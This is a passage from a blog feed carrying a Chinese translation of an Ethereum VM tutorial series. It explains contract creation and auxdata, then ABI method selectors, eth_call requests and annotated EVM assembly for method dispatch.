class="line-numbers language-bash" data-language="bash"><code class="language-bash">0000000000000000000000000000000000000000000000000000000000000042<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>为了处理构造函数中的参数，部署代码将 ABI 参数从 <code>calldata</code>​ 的末尾复制到内存中，然后从内存复制到堆栈中。</p><h2 id="A-Contract-That-Creats-Contracts"><a href="#A-Contract-That-Creats-Contracts" class="headerlink" title="A Contract That Creats Contracts"></a>A Contract That Creats Contracts</h2><p><code>FooFactory</code>​ 合约可以通过调用 <code>makeNewFoo</code>​ 创建新的 <code>Foo</code>​ 实例：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Foo</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">FooFactory</span> <span class="token punctuation">&#123;</span><span class="token builtin">address</span> fooInstance<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">makeNewFoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fooInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约的完整汇编在 <a href="https://gist.github.com/hayeah/a94aa4e87b7b42e9003adf64806c84e4">This Gist</a> 中。编译器输出的结构比较复杂，因为有两组“install time”和“run time”字节码。它是这样组织的：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FooFactoryDeployCodeFooFactoryContractCodeFooDeployCodeFooContractCodeFooAUXDataFooFactoryAUXData<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>FooFactoryContractCode</code>​ 基本上是复制 <code>tag_8</code>​ 中 <code>Foo</code>​ 的字节码，然后跳转回 <code>tag_7</code>​ 以执行 <code>create</code>​ 指令。</p><p><code>create</code>​ 指令类似于 <code>eth_sendtransaction</code>​ RPC 调用。它提供了一种在 EVM 内创建新合约的方法。</p><p>有关 go-ethereum 源代码，请参见 <a href="https://sourcegraph.com/github.com/ethereum/go-ethereum@e9295163aa25479e817efee4aac23eaeb7554bba/-/blob/core/vm/instructions.go#L572:6">opCreate</a>。该指令调用 <code>evm.Create</code>​ 来创建一个合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go">res<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> returnGas<span class="token punctuation">,</span> suberr <span class="token operator">:=</span> evm<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>contract<span class="token punctuation">,</span> input<span class="token punctuation">,</span> gas<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>我们之前见过 <code>evm.Create</code>​，但这次调用者是智能合约，而不是人。</p><h2 id="AUXDATA"><a href="#AUXDATA" class="headerlink" title="AUXDATA"></a>AUXDATA</h2><p>如果您真的必须了解 auxdata 是什么，请阅读 <a href="https://github.com/ethereum/solidity/blob/8fbfd62d15ae83a757301db35621e95bccace97b/docs/metadata.rst#encoding-of-the-metadata-hash-in-the-bytecode">Contract Metadata</a>。它的要点是 <code>auxdata</code>​ 是一个哈希值，您可以使用它来获取有关已部署合约的元数据。</p><p><code>auxdata</code>​ 的格式为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0xa1 0x65 <span class="token string">'b'</span> <span class="token string">'z'</span> <span class="token string">'z'</span> <span class="token string">'r'</span> <span class="token string">'0'</span> 0x58 0x20 <span class="token operator">&lt;</span><span class="token number">32</span> bytes swarm hash<span class="token operator">></span> 0x00 0x29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>解构我们之前看到的 auxdata 字节序列：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a1 <span class="token number">65</span>// b z z r <span class="token number">0</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">)</span><span class="token number">62</span> 7a 7a <span class="token number">72</span> <span class="token number">30</span><span class="token number">58</span> <span class="token number">20</span>// <span class="token number">32</span> bytes <span class="token builtin class-name">hash</span>62a4d50871818ee0922255f5848ba4c7e4edc9b13c555984b91e7447d3bb0e7400 <span class="token number">29</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>合约被创建的方式类似于自解压软件安装程序的工作方式。当安装程序运行时，它会配置系统环境，然后通过读取其程序包将目标程序提取到系统中。</p><ul><li>“install time”和“run time”之间存在强制分离。没有办法运行构造函数两次。</li><li>智能合约可以使用相同的过程来创建其他智能合约。</li><li>非 Solidity 语言很容易实现。</li></ul><p>起初，我发现“智能合约安装程序”的不同部分在交易中作为 <code>data</code>​ 字节字符串打包在一起，这让我感到困惑：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"data"</span><span class="token operator">:</span> constructorCode + contractCode + auxdata + constructorData<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>从阅读 <code>eth_sendtransaction</code>​ 的文档来看，<code>data</code>​ 应该如何编码并不明显。我无法弄清楚构造函数参数是如何传递到交易中的，直到一个朋友告诉我它们是 ABI 编码然后附加到字节码的末尾。</p><p>另一种更清晰的设计可能是将这些部分作为交易中的单独属性发送：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token comment">// For "install time" bytecode</span><span class="token property">"constructorCode"</span><span class="token operator">:</span> ...<span class="token punctuation">,</span><span class="token comment">// For "run time" bytecode</span><span class="token property">"constructorBody"</span><span class="token operator">:</span> ...<span class="token punctuation">,</span><span class="token comment">// For encoding arguments</span><span class="token property">"data"</span><span class="token operator">:</span> ...<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>不过，仔细想想，我认为 Transaction 对象如此简单实际上非常强大。对于交易来说，<code>data</code>​ 只是一个字节字符串，它并没有规定如何解释数据的语言模型。通过保持 Transaction 对象的简单性，语言实现者有一个用于设计和实验的空白画布(blank canvas)。</p><p>事实上，未来 <code>data</code>​ 甚至可以由不同的虚拟机解释。</p><h2 id="Other-Parts"><a href="#Other-Parts" class="headerlink" title="Other Parts"></a>Other Parts</h2><p>‍在这一系列文章中，我翻译了 <a href="https://medium.com/@hayeah">Howard</a> 的 <a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum VM</a> 系列文章。译文链接如下：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/">深入以太坊虚拟机 Part6 — Solidity 事件实现</a><br>也可以直接看总结篇：</li><li><a href="http://alphafitz.com/2022/10/17/diving-into-the-ethereum-vm-summary">深入以太坊虚拟机 总结</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入以太坊虚拟机-Part5-—-智能合约创建过程&quot;&gt;&lt;a href=&quot;#深入以太坊虚拟机-Part5-—-智能合约创建过程&quot; class=&quot;headerlink&quot; title=&quot;深入以太坊虚拟机 Part5 — 智能合约创建过程&quot;&gt;&lt;/a&gt;深入以太坊虚拟机 Pa</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊虚拟机" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深入以太坊虚拟机 Part4 — 智能合约外部方法调用</title>
    <link href="https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/"/>
    <id>https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/</id>
    <published>2022-10-07T08:39:47.000Z</published>
    <updated>2022-10-17T04:06:15.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入以太坊虚拟机-Part4-—-智能合约外部方法调用"><a href="#深入以太坊虚拟机-Part4-—-智能合约外部方法调用" class="headerlink" title="深入以太坊虚拟机 Part4 — 智能合约外部方法调用"></a>深入以太坊虚拟机 Part4 — 智能合约外部方法调用</h1><blockquote><p>原文：<a href="https://medium.com/@hayeah/how-to-decipher-a-smart-contract-method-call-8ee980311603">How To Decipher A Smart Contract Method Call | by Howard | Sep 18, 2017</a></p></blockquote><p>在本系列的前几篇文章中，我们已经了解了 Solidity 如何表示 EVM 存储中的复杂数据结构。但是，如果无法与之交互，数据将毫无用处。智能合约是数据与外界之间的中介。</p><p>在本文中，我们将了解 Solidity 和 EVM 如何使外部程序能够调用合约的方法并导致其状态发生变化。</p><p>“外部程序”不限于 DApp&#x2F;JavaScript。任何可以使用 HTTP RPC 与以太坊节点通信的程序都可以通过创建交易与部署在区块链上的任何合约进行交互。</p><p>创建一个交易就像发出一个 HTTP 请求。Web 服务器将接受您的 HTTP 请求并对数据库进行更改。交易会被网络接受，并且底层区块链扩展到包括状态变化。</p><p>交易之于智能合约就像 HTTP 请求之于 Web 服务一样。</p><p>如果对 EVM 汇编和 Solidity 数据表示不熟悉，请参阅本系列之前的文章以了解更多信息：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示 </a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li></ul><h2 id="Contract-Transaction"><a href="#Contract-Transaction" class="headerlink" title="Contract Transaction"></a>Contract Transaction</h2><p>让我们看一个将状态变量设置为 <code>0x1</code>​ 的交易。我们要与之交互的合约具有变量 <code>a</code>​ 的 setter 和 getter：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">setA</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> _a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约部署在测试网络 Rinkeby 上。随意使用地址 <a href="https://rinkeby.etherscan.io/address/0x62650ae5c5777d1660cc17fcd4f48f6a66b9a4c2">0x62650ae5…</a> 的 Etherscan 检查它。</p><p>我创建了一个调用 <code>setA(1)</code>​ 的交易。在地址 <a href="https://rinkeby.etherscan.io/tx/0x7db471e5792bbf38dc784a5b983ee6a7bbe3f1db85dd4daede9ee88ed88057a5">0x7db471e5…</a> 处检查此交易。</p><p>交易的输入数据为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0xee919d500000000000000000000000000000000000000000000000000000000000000001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>对于 EVM，这只是 36 字节的原始数据。它作为 <code>calldata</code>​ 未经处理传递给智能合约。如果智能合约是一个 Solidity 程序，那么它将这些输入字节解释为一个方法调用，并为 <code>setA(1)</code>​ 执行适当的汇编代码。</p><p>输入数据可以分解为两个子部分：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># The method selector (4 bytes)</span>0xee919d5<span class="token comment"># The 1st argument (32 bytes)</span>00000000000000000000000000000000000000000000000000000000000000001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>前四个字节是方法选择器(method selector)。其余的输入数据是 32 字节的块的方法参数。在这个例子中，只有 1 个参数，即值 <code>0x1</code>​。</p><p>方法选择器是方法签名的 kecccak256 哈希。在这个例子中，方法签名是 <code>setA(uint256)</code>​，它是方法的名称及其参数的类型。</p><p>让我们用 Python 计算方法选择器。首先，哈希方法签名：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Install pyethereum https://github.com/ethereum/pyethereum/#installation</span><span class="token operator">></span> from ethereum.utils <span class="token function">import</span> sha3<span class="token operator">></span> sha3<span class="token punctuation">(</span><span class="token string">"setA(uint256)"</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'ee919d50445cd9f463621849366a537968fe1ce096894b0d0c001528383d4769'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后取哈希的前 4 个字节：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sha3<span class="token punctuation">(</span><span class="token string">"setA(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span>:8<span class="token punctuation">]</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'ee919d50'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><blockquote><p>注意：每个字节由 Python 十六进制字符串中的 2 个字符表示</p></blockquote><h2 id="The-Application-Binary-Interface-ABI"><a href="#The-Application-Binary-Interface-ABI" class="headerlink" title="The Application Binary Interface (ABI)"></a>The Application Binary Interface (ABI)</h2><p>就 EVM 而言，交易的输入数据（<code>calldata</code>​）只是一个字节序列。 EVM 没有对调用方法的内置支持。</p><p>智能合约可以选择通过结构化方式处理输入数据来模拟方法调用，如上一节所示。</p><p>如果 EVM 上的语言都同意如何解释输入数据，那么它们可以轻松地相互操作。<a href="https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI#formal-specification-of-the-encoding">合约应用程序二进制接口</a> (ABI) 指定了一个通用的编码方案。</p><p>我们已经看到了 ABI 如何编码像 <code>setA(1)</code>​ 这样的简单方法调用。在后面的部分中，我们将看到如何对具有更复杂参数的方法调用进行编码。</p><h2 id="Calling-A-Getter"><a href="#Calling-A-Getter" class="headerlink" title="Calling A Getter"></a>Calling A Getter</h2><p>如果你调用的方法改变了状态，那么整个网络都必须同意。这将需要交易，并且会花费你的 gas。</p><p>像 <code>getA()</code>​ 这样的 getter 方法不会改变任何东西。我们可以将方法调用发送到本地以太坊节点，而不是要求整个网络进行计算。<code>eth_call</code>​ RPC 请求允许您在本地模拟交易。这对于只读方法或 gas 费使用估计很有用。</p><p><code>eth_call</code>​ 类似于缓存的 HTTP GET 请求。</p><ul><li>它不会改变全球共识状态。</li><li>本地区块链（“缓存”）可能稍稍过时。</li></ul><p>让我们使用 <code>eth_call</code>​ 来调用 <code>getA</code>​ 方法，得到状态 <code>a</code>​ 作为返回。首先，计算方法选择器：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> sha3<span class="token punctuation">(</span><span class="token string">"getA()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span>:8<span class="token punctuation">]</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'d46300fd'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>由于没有参数，输入数据本身就是方法选择器。我们可以向任何以太坊节点发送 <code>eth_call</code>​ 请求。在本例中，我们将请求发送到 infura.io 托管的公共以太坊节点：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> -X POST <span class="token punctuation">\</span>-H <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span><span class="token string">"https://rinkeby.infura.io/YOUR_INFURA_TOKEN"</span> <span class="token punctuation">\</span>--data <span class="token string">'&#123;  "jsonrpc": "2.0",  "id": 1,  "method": "eth_call",  "params": [    &#123;      "to": "0x62650ae5c5777d1660cc17fcd4f48f6a66b9a4c2",      "data": "0xd46300fd"    &#125;,    "latest"  ]&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>EVM 执行计算并返回原始字节作为结果：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token string">"jsonrpc"</span><span class="token builtin class-name">:</span><span class="token string">"2.0"</span>,<span class="token string">"id"</span>:1,        <span class="token string">"result"</span><span class="token builtin class-name">:</span><span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000001"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>根据 ABI，字节应该被解释为值 <code>0x1</code>​。</p><h2 id="Assembly-For-External-Method-Calling"><a href="#Assembly-For-External-Method-Calling" class="headerlink" title="Assembly For External Method Calling"></a>Assembly For External Method Calling</h2><p>现在让我们看看编译后的合约如何处理原始输入数据以进行方法调用。考虑一个定义了 <code>setA(uint256)</code>​ 的合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// call.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token comment">// Note: `payable` makes the assembly a bit simpler</span><span class="token keyword">function</span> <span class="token function">setA</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _a<span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> _a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>编译：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">solc --bin --asm --optimize call.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>被调用方法的汇编代码在合约主体中，组织在 <code>sub_0</code>​ 下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sub_0: assembly <span class="token punctuation">&#123;</span>    mstore<span class="token punctuation">(</span>0x40, 0x60<span class="token punctuation">)</span>    and<span class="token punctuation">(</span>div<span class="token punctuation">(</span>calldataload<span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>, 0x100000000000000000000000000000000000000000000000000000000<span class="token punctuation">)</span>, 0xffffffff<span class="token punctuation">)</span>    0xee919d50    dup2    eq    tag_2    jumpi  tag_1:    0x0    dup1    revert  tag_2:    tag_3    calldataload<span class="token punctuation">(</span>0x4<span class="token punctuation">)</span>    jump<span class="token punctuation">(</span>tag_4<span class="token punctuation">)</span>  tag_3:    stop  tag_4:      /* <span class="token string">"call.sol"</span>:95:96  a */    0x0      /* <span class="token string">"call.sol"</span>:95:101  a <span class="token operator">=</span> _a */    dup2    swap1    sstore  tag_5:    pop    jump // outauxdata: 0xa165627a7a7230582016353b5ec133c89560dea787de20e25e96284d67a632e9df74dd981cc4db7a0a0029<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>有两段样板代码与本次讨论无关，但仅供参考(FYI)：</p><ul><li>最顶部的 <code>mstore(0x40, 0x60)</code>​ 保留内存中的前 64 字节用于 sha3 哈希。无论合约是否需要，这始终存在。</li><li>最底部的 <code>auxdata</code>​ 用于验证发布的源代码与部署的字节码是否相同。这是可选的，但已包含在编译器中。</li></ul><p>让我们将剩余的汇编代码分成两部分以便于分析：</p><ol><li>匹配选择器并跳转到方法。</li><li>加载参数，执行方法，并从方法返回。</li></ol><p>首先，用于匹配选择器的带注释汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Load the first <span class="token number">4</span> bytes as method selectorand<span class="token punctuation">(</span>div<span class="token punctuation">(</span>calldataload<span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>, 0x100000000000000000000000000000000000000000000000000000000<span class="token punctuation">)</span>, 0xffffffff<span class="token punctuation">)</span>// <span class="token keyword">if</span> selector matches <span class="token variable"><span class="token variable">`</span>0xee919d50<span class="token variable">`</span></span>, goto setA0xee919d50dup2eqtag_2jumpi// No matching method. Fail <span class="token operator">&amp;</span> revert.tag_1:  0x0  dup1  revert// Body of setAtag_2:  <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>除了在开始时从 call data 中加载 4 个字节的 bit-shuffling 外，都很简单。为清楚起见，低级伪代码中的汇编逻辑如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">methodSelector <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">0</span>:4<span class="token punctuation">]</span><span class="token keyword">if</span> methodSelector <span class="token operator">==</span> <span class="token string">"0xee919d50"</span><span class="token builtin class-name">:</span>  goto tag_2 // goto setAelse:  // No matching method. Fail <span class="token operator">&amp;</span> revert.  revert<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>实际方法调用的注释汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// setAtag_2:  // Where to goto after method call  tag_3  // Load first argument <span class="token punctuation">(</span>the value 0x1<span class="token punctuation">)</span>.  calldataload<span class="token punctuation">(</span>0x4<span class="token punctuation">)</span>  // Execute method.  jump<span class="token punctuation">(</span>tag_4<span class="token punctuation">)</span>tag_4:  // sstore<span class="token punctuation">(</span>0x0, 0x1<span class="token punctuation">)</span>  0x0  dup2  swap1  sstoretag_5:  pop  // end of program, will goto tag_3 and stop  jumptag_3:  // end of program  stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在进入方法部分之前，汇编做了两件事：</p><ol><li>保存方法调用后返回的位置。</li><li>将 call data 中的参数加载到堆栈上。</li></ol><p>在低级伪代码中：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Saves the position to <span class="token builtin class-name">return</span> to after method call.@returnTo <span class="token operator">=</span> tag_3tag_2: // setA  // Loads the arguments from call data onto the stack.  @arg1 <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">4</span>:4+32<span class="token punctuation">]</span>tag_4: // a <span class="token operator">=</span> _a  sstore<span class="token punctuation">(</span>0x0, @arg1<span class="token punctuation">)</span>tag_5 // <span class="token builtin class-name">return</span>  jump<span class="token punctuation">(</span>@returnTo<span class="token punctuation">)</span>tag_3:  stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>将两个部分结合在一起：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">methodSelector <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">0</span>:4<span class="token punctuation">]</span><span class="token keyword">if</span> methodSelector <span class="token operator">==</span> <span class="token string">"0xee919d50"</span><span class="token builtin class-name">:</span>  goto tag_2 // goto setAelse:  // No matching method. Fail.  revert@returnTo <span class="token operator">=</span> tag_3tag_2: // setA<span class="token punctuation">(</span>uint256 _a<span class="token punctuation">)</span>  @arg1 <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">4</span>:36<span class="token punctuation">]</span>tag_4: // a <span class="token operator">=</span> _a  sstore<span class="token punctuation">(</span>0x0, @arg1<span class="token punctuation">)</span>tag_5 // <span class="token builtin class-name">return</span>  jump<span class="token punctuation">(</span>@returnTo<span class="token punctuation">)</span>tag_3:  stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>Fun trivia：revert 的操作码是 <code>fd</code>​。但是您不会在黄皮书中找到它的规范，也不会在代码中找到它的实现。事实上，<code>fd</code>​ 并不真实存在！这是一个无效的操作。当 EVM 遇到无效操作时，它会放弃并恢复状态作为副作用 (revert state as a side-effect)。</p></blockquote><h2 id="Handling-Multiple-Methods"><a href="#Handling-Multiple-Methods" class="headerlink" title="Handling Multiple Methods"></a>Handling Multiple Methods</h2><p>Solidity 编译器如何为具有多种方法的合约生成汇编代码？</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token builtin">uint256</span> b<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">setA</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> _a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">setB</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>b <span class="token operator">=</span> _b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>简单。只是一个接一个的更多的 <code>if-else</code>​ 分支：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// methodSelector <span class="token operator">=</span> calldata<span class="token punctuation">[</span><span class="token number">0</span>:4<span class="token punctuation">]</span>and<span class="token punctuation">(</span>div<span class="token punctuation">(</span>calldataload<span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>, 0x100000000000000000000000000000000000000000000000000000000<span class="token 